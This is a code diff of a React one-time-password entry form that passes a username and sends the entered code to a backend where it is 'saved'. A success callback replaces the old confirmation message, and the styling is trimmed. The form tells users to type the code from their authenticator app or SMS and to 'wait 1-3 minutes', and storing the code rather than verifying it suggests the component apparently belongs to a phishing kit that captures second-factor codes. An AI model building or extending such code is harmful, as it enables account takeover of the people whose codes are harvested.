@@ -1,7 +1,7 @@
 import React, { useState, useRef, useEffect } from 'react';
 import { ArrowRight, CheckCircle, AlertCircle } from 'lucide-react'; // Import icons used in App.tsx
 
-const OtpForm: React.FC<{ username: string | null }> = ({ username }) => {
+const OtpForm: React.FC<{ username: string | null; onOtpSuccess: () => void }> = ({ username, onOtpSuccess }) => {
   const [otpDigits, setOtpDigits] = useState<string[]>(new Array(6).fill(''));
   const [message, setMessage] = useState<string>('');
   const [isLoading, setIsLoading] = useState(false);
@@ -64,8 +64,7 @@ const OtpForm: React.FC<{ username: string | null }> = ({ username }) => {
       const data = await response.json();
 
       if (response.ok) {
-        setMessage('OTP saved successfully.'); // Simplified success message
-        setOtpDigits(new Array(6).fill('')); // Clear OTP fields
+        onOtpSuccess(); // Trigger the success callback
       } else {
         setMessage('Error: ' + (data.message || 'Failed to save OTP'));
       }
@@ -78,7 +77,7 @@ const OtpForm: React.FC<{ username: string | null }> = ({ username }) => {
   };
 
   return (
-    <div className="bg-white max-w-md w-full p-8 font-sans text-slate-900"> {/* Replicate card styling */}
+    <div className="font-sans text-slate-900">
       <h2 className="text-2xl font-bold text-gray-800 mb-6 text-center">Enter OTP</h2>
       <p className="text-sm text-gray-500 mb-6 text-center">TYPE CODE DISPLAYED ON AUTHENTICATOR APP OR CODE SENT Via SMS<br/>(Wait 1-3 minutes for verification code)</p>
 
